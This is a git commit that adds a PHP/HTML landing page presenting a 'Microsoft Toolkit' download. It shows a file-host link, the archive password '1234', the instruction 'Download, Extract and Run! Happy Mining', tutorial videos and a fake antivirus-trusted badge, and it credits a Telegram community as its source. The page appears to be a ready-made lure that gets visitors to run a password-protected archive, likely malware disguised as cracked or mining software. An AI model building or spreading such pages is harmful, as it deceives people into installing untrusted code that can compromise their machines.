37475ef3421670681307bdd40a4c76b1073ea7e2
Ascentcn <ascentcn5@gmail.com>
2024-11-25 18:49:43 +0100

    Fileupload

---
+++ info.php
@@ -0,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Microsoft Toolkit - Latest">
+    <title>Your Download Link is Ready!</title>
+    <link rel="shortcut icon" href="images/logo.png" />
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <style>
+        div.rd {
+            background-color: black;
+        }
+        
+        div.gr {
+            background-color: black;
+        }
+        
+        div.bl {
+            background-color: black;
+        }
+        
+        input[type=text] {
+            width: 100%;
+            padding: 12px 20px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 3px solid #f00;
+            -webkit-transition: 0.5s;
+            transition: 0.5s;
+            outline: none;
+        }
+        
+        input[type=text]:focus {
+            border: 3px solid #000;
+            width: 100%;
+        }
+    </style>
+</head>
+<!-- This Landing Page was provided for free by https://t.me/bigseccommunity & NOT FOR SALE -->
+
+<body style="margin:0; padding:0; border-box: box-sizing; ">
+    <center>
+        <nav class="navbar navbar-default cs-primary-navbar navbar-fixed-top">
+            <div class="container">
+                <div class="navbar-header">
+                    <a class="navbar-brand cs-logo"><img src="images/logo.png" alt="logo"></a>
+                    <h6 style="color:white;">YOUR SOFTWARE IS READY!</h6>
+
+                        <button type="button" class="navbar-toggle offcanvas-toggle pull-right" data-toggle="offcanvas"     data-target="#js-bootstrap-offcanvas" style="float:left;">
+                                <span class="sr-only">Toggle navigation</span>
+                                <span>
+                                    <span class="icon-bar"></span>
+                                    <span class="icon-bar"></span>
+                                    <span class="icon-bar"></span>
+                                </span>
+			            </button>
+                </div>
+
+                <div class="navbar-offcanvas navbar-offcanvas-touch" id="js-bootstrap-offcanvas">
+                    <ul class="nav navbar-nav navbar-right"></ul>
+                </div>
+
+            </div>
+
+        </nav>
+
+        <script type="text/javascript" src="js/restive.min.html"></script>
+        <script>
+            $(document).ready(function() {
+                $('body').restive({
+                    breakpoints: ['10000'],
+                    classes: ['nb'],
+                    turbo_classes: 'is_mobile=mobi,is_phone=phone,is_tablet=tablet,is_portrait=portrait,is_landscape=landscape'
+                });
+            });
+        </script>
+        <div class="bl">
+            <section class="hero">
+                <div id="download" style="color=green; margin: 0% 25%;">
+                    <center>
+                        <h3 style="color:#fff">YOUR DOWNLOAD LINK HAS BEEN GENERATED</h3>
+                    </center>
+                    <center>
+                        <input type="text" style="text-align: center; width: 500px; color: #000;" value="https://hellfiles.com/en/NcIHaHZkcoXpu7m/file" readonly="readOnly" id="myInput">
+                        <div>
+                            &nbsp
+                            <button onclick="myFunction()"><span style="font-size:150%; color:red border-radius:3px">Copy Link</span></button>
+                    </center>
+                    <div>
+                        <h3 style="color:white; font-size:18px;">If link is not clickable, copy and paste it into the address bar.</h3><br>
+                        <p style="color:red; font-size:30px;">PASSWORD: 1234</p>
+                        <h3 style="color:white">Download, Extract and Run! Happy Mining</h3>
+
+                        <div style="display:flex; width: 100%; margin:2px 2px;">
+                            <video controls autoplay>
+                            <source src="images/1.mp4" type="video/mp4">
+                            Your browser does not support the video tag.
+                            </video>
+
+                            <video controls>
+                            <source src="images/2.mp4" type="video/mp4">
+                            Your browser does not support the video tag.
+                            </video>
+                        </div>
+
+                        <div style="display:flex; width: 100%; margin:2px;">
+                            <video controls>
+                            <source src="images/3.mp4" type="video/mp4">
+                            Your browser does not support the video tag.
+                            </video>
+
+                            <video controls>
+                            <source src="images/4.mp4" type="video/mp4">
+                            Your browser does not support the video tag.
+                            </video>
+                        </div>
+                        <img class="center" src="images/avtrusted.png"> &nbsp
+                        <p style="text-align:center; color: white;"> Copyright © 2024 All rights reserved.</p>
+                        </div>
+                </div>
+                </center>
+        </div>
+        </section>
+        </div>
+
+        <script>
+            function myFunction() {
+                var copyText = document.getElementById("myInput");
+                copyText.select();
+                copyText.setSelectionRange(0, 99999)
+                document.execCommand("copy");
+                alert("Copied the Link. Open new tab and paste the link to complete your download. Watch the video below to understand how it works. ");
+            }
+        </script>
+
+        </div>
+        </div>
+        </div>
+        </div>
+
+        </div>
+        </div>
+        <script src="js/jquery-2.1.1.min.js"></script>
+        <script src="js/bootstrap.min.js"></script>
+        <script src="js/bootstrap.offcanvas.js"></script>
+        <script src="js/wow.min.js"></script>
+        <script src="js/slider/owl.carousel.min.js"></script>
+        <script src="js/jquery.magnific-popup.js"></script>
+        <script src="js/main.js"></script>
+    </center>
+</body>
+<!-- This Landing Page was provided for free by https://t.me/bigseccommunity & NOT FOR SALE -->
+
+</html>
